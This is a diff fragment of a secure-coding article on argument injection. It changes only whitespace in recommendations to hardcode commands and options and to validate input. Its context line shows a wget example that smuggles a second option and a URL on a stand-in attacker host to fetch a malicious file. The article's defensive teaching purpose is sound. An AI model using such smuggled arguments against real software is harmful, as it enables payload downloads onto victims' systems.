@@ -260,10 +260,10 @@ wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malici
 
 Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.
 
-In addition, it is good security practice to follow these recommendations:  
+In addition, it is good security practice to follow these recommendations:
 
-- **Hardcode the command**: never allow the user to choose which executable to run.  
-- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.  
+- **Hardcode the command**: never allow the user to choose which executable to run.
+- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.
 - **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.
 
 ## Related articles
